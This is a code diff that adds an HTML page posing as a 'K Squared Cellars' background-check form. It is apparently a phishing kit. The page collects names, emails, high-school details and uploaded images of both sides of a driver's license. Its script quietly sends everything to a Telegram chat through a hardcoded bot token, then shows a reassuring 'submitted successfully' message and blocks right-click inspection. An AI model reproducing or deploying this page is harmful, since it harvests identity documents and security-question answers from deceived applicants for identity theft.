@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>K Squared Cellars – Background Check</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: url('https://i.imgur.com/4pYTPl3.png') no-repeat center center fixed;
+      background-size: cover;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+    .upload-container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 20px;
+      margin-top: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 320px;
+    }
+    h2 {
+      text-align: center;
+      color: #333;
+      margin-top: 0;
+      font-size: 18px;
+    }
+    .form-group {
+      margin-bottom: 12px;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 4px;
+      font-size: 14px;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="number"],
+    input[type="file"] {
+      width: 100%;
+      padding: 7px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #673ab7;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #5e35b1;
+    }
+    .success {
+      margin-top: 12px;
+      text-align: center;
+      color: green;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body oncontextmenu="return false;">
+  <div class="upload-container">
+    <h2>K Squared Cellars – Background Check</h2>
+    <form id="licenseForm">
+      <div class="form-group">
+        <label for="fullName">Full Name</label>
+        <input type="text" id="fullName" name="fullName" required />
+      </div>
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" required />
+      </div>
+      <div class="form-group">
+        <label for="schoolName">High School Name</label>
+        <input type="text" id="schoolName" name="schoolName" required />
+      </div>
+      <div class="form-group">
+        <label for="yearStarted">Year Started</label>
+        <input type="number" id="yearStarted" name="yearStarted" min="1900" max="2099" required />
+      </div>
+      <div class="form-group">
+        <label for="yearGraduated">Year Graduated</label>
+        <input type="number" id="yearGraduated" name="yearGraduated" min="1900" max="2099" required />
+      </div>
+      <div class="form-group">
+        <label for="frontImage">Front of Driver's License</label>
+        <input type="file" id="frontImage" name="frontImage" accept=".jpg,.jpeg,.png,.pdf" required />
+      </div>
+      <div class="form-group">
+        <label for="backImage">Back of Driver's License</label>
+        <input type="file" id="backImage" name="backImage" accept=".jpg,.jpeg,.png,.pdf" required />
+      </div>
+      <button type="submit">Submit</button>
+      <div class="success" id="successMessage"></div>
+    </form>
+  </div>
+
+  <script>
+    // Disable right-click context menu
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    document.getElementById("licenseForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const fullName = document.getElementById("fullName").value;
+      const email = document.getElementById("email").value;
+      const schoolName = document.getElementById("schoolName").value;
+      const yearStarted = document.getElementById("yearStarted").value;
+      const yearGraduated = document.getElementById("yearGraduated").value;
+      const frontFile = document.getElementById("frontImage").files[0];
+      const backFile = document.getElementById("backImage").files[0];
+
+      if (!frontFile || !backFile) {
+        alert("Please upload both front and back of your driver's license.");
+        return;
+      }
+
+      const telegram_bot_token = "6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4";
+      const telegram_chat_id = "1461764555";
+
+      const message = `
+👤 *K Squared Cellars - Background Check Submission*
+——————————————
+👤 Full Name: ${fullName}
+📧 Email: ${email}
+🏫 School: ${schoolName}
+📅 Year Started: ${yearStarted}
+📅 Year Graduated: ${yearGraduated}
+🕒 Time: ${new Date().toLocaleString()}
+——————————————
+`;
+
+      // Send text message first
+      await fetch(`https://api.telegram.org/bot${telegram_bot_token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: telegram_chat_id,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+
+      // Helper function to send a file
+      const sendFile = async (file, caption) => {
+        const formData = new FormData();
+        formData.append("chat_id", telegram_chat_id);
+        formData.append("document", file, file.name);
+        formData.append("caption", caption);
+
+        await fetch(`https://api.telegram.org/bot${telegram_bot_token}/sendDocument`, {
+          method: "POST",
+          body: formData
+        });
+      };
+
+      // Send front and back images
+      await sendFile(frontFile, `${fullName} - Front of Driver's License`);
+      await sendFile(backFile, `${fullName} - Back of Driver's License`);
+
+      document.getElementById("successMessage").innerText = "✅ Submitted successfully. Thank you!";
+      document.getElementById("licenseForm").reset();
+    });
+  </script>
+</body>
+</html>
